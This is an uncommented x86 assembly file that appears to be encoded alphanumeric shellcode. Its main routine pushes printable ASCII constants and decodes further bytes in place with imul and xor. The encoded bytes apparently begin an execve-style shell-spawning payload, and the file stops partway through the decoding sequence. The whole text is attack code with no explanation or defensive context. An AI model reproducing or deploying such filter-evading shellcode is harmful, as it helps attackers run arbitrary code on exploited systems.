SECTION .data

SECTION .text

global main


main:
 push 0x6b695869
 push 0x7037367a
 push 0x73415858
 push 0x79774a71
 push 0x31577765
 push 0x6850c031
 push eax
 push eax
 push eax
 push eax
 push eax
 push eax
 push eax
 push eax
 push eax
 push eax
 push eax
 push eax
 push eax
 push eax
 push eax
 push eax
 push eax
 push eax
 push esp
 pop ecx
 imul edx, [ecx+0x58], 0x57
 inc edx
 push edx
 imul edx, [ecx+0x54], 0x78
 xor al, 0x63
 push eax
 imul edx, [ecx+0x50], 0x4a
 dec edx
 dec edx
 push edx
 imul edx, [ecx+0x4c], 0x79
 dec edx
 push edx
 imul edx, [ecx+0x48], 0x36
 xor al, 0x61
 push eax
 imul edx, [ecx+0x44], 0x79
 dec edx
 push edx
